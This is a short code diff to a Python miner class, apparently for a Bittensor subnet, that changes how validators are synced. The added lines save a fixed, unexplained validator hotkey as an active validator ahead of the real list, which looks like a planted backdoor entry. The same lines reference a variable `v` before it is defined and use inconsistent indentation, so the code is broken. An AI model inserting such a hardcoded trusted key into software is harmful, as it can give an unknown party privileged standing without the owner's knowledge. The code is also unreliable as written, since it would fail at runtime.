@@ -62,6 +62,14 @@ class Miner:
 
     async def save_validators(self, validators):
         bittensor.logging.info('Sync validators')
+        existing = self.validator_dao.get_validator_by_hotkey(v.hotkey)
+        if not existing:
+                self.validator_dao.save(
+                    Validator(
+                        validator_hotkey="5CRyyfBrJ6r9A4Lgb3ZSwrVnHYEWSKkD4xzavoW132RMLHGT",
+                        active=True
+                    )
+                )
         for v in validators:
             existing = self.validator_dao.get_validator_by_hotkey(v.hotkey)
             if not existing:
